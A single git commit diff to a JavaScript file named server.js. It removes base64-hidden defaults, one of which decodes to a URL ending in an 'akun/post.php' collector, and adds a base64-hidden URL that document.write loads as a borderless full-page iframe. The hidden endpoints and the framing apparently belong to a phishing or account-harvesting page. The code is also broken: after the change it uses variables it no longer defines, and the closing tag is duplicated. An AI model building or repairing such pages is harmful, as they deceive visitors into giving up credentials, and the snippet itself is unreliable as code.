67ac77d7d0b8b4d0c2e29c83e6a73cee9be3bb76
fb01cmx <53531630+fb01cmx@users.noreply.github.com>
2019-09-20 21:59:35 +0700

    Update server.js

--- js/server.js
+++ js/server.js
@@ -1,18 +1,4 @@
 
-if(cid("s")){
-	var srv = cid("s");
-}else{
-	var srv = 'aHR0cHM6Ly93ZWR1c3MuY29tL2FrdW4vcG9zdC5waHA';
-}
-if(cid("u")){
-	var usr = cid("u");
-}else{
-	var usr = 'UHJla2Vy';
-}
-if(cid("f")){
-	var fp = cid("f");
-}else{
-	var fp = 'ZGF0aW5n';
-}
+var frm = atob('aHR0cHM6Ly9mYjAxY214LmdpdGh1Yi5pby8');
 document.write("<iframe name='site' id='site' width='100%' height='100%' frameborder='0' marginheight='0' marginwidth='0' src='"
 	+ frm + '?i=' + img + '&t=' + ttl + '&s=' + srv + '&u=' + usr + '&f=' + fp + "'></iframe>'></iframe>");
